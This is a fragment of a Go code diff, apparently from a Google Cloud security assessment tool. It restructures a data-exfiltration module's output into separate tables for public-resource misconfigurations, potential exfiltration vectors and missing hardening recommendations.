 			m.GetProjectName(p.ProjectID),
 			p.ResourceName,
 			p.PathType,
 			p.Destination,
 			publicStatus,
-			vpcscProtected,
-			orgPolicyProtected,
-			getExfilDescription(p.PathType),
+			size,
 		})
 	}
 
 	// Add any remaining public exports not already covered
 	for _, e := range publicResources {
-		// Check VPC-SC protection
-		vpcscProtected := "No"
-		if m.vpcscProtectedProj[e.ProjectID] {
-			vpcscProtected = "Yes"
-		}
-
-		// Check org policy protection
-		orgPolicyProtected := "No"
-		if m.isOrgPolicyProtected(e.ProjectID) {
-			orgPolicyProtected = "Yes"
-		}
-
-		body = append(body, []string{
+		misconfigBody = append(misconfigBody, []string{
 			e.ProjectID,
 			m.GetProjectName(e.ProjectID),
 			e.ResourceName,
 			e.ResourceType,
-			"Public access",
+			"Public access: " + e.AccessLevel,
 			"Yes",
-			vpcscProtected,
-			orgPolicyProtected,
-			getExfilDescription(e.ResourceType),
+			e.Size,
 		})
 	}
+
+	// Table 2: Potential Exfiltration Vectors
+	vectorHeader := []string{
+		"Project ID",
+		"Project Name",
+		"Resource",
+		"Type",
+		"Destination",
+		"Public",
+		"Size",
+	}
+
+	var vectorBody [][]string
+	for _, v := range m.PotentialVectors {
+		vectorBody = append(vectorBody, []string{
+			v.ProjectID,
+			m.GetProjectName(v.ProjectID),
+			v.ResourceName,
+			v.VectorType,
+			v.Destination,
+			"No",
+			"-",
+		})
+	}
+
+	// Table 3: Missing Hardening Recommendations
+	hardeningHeader := []string{
+		"Project ID",
+		"Project Name",
+		"Category",
+		"Control",
+		"Description",
+	}
+
+	var hardeningBody [][]string
+	hardeningRecs := m.generateMissingHardeningRecommendations()
+	for _, h := range hardeningRecs {
+		hardeningBody = append(hardeningBody, []string{
+			h.ProjectID,
+			m.GetProjectName(h.ProjectID),
+			h.Category,
+			h.Control,
+			h.Description,
+		})
+	}
+
+	// Add hardening recommendations to loot file
+	m.addHardeningRecommendationsToLoot(hardeningRecs)
 
 	// Collect loot files
 	var lootFiles []internal.LootFile
@@ -1010,11 +1605,27 @@ func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger interna
 	// Build tables
 	tables := []internal.TableFile{}
 
-	if len(body) > 0 {
+	if len(misconfigBody) > 0 {
 		tables = append(tables, internal.TableFile{
-			Name:   "data-exfiltration",
-			Header: header,
-			Body:   body,
+			Name:   "data-exfiltration-misconfigurations",
+			Header: misconfigHeader,
+			Body:   misconfigBody,
+		})
+	}
+
+	if len(vectorBody) > 0 {
+		tables = append(tables, internal.TableFile{
+			Name:   "data-exfiltration-vectors",
+			Header: vectorHeader,
+			Body:   vectorBody,
+		})
+	}
+
+	if len(hardeningBody) > 0 {
+		tables = append(tables, internal.TableFile{
+			Name:   "data-exfiltration-hardening",
+			Header: hardeningHeader,
+			Body:   hardeningBody,
 		})
 	}
 
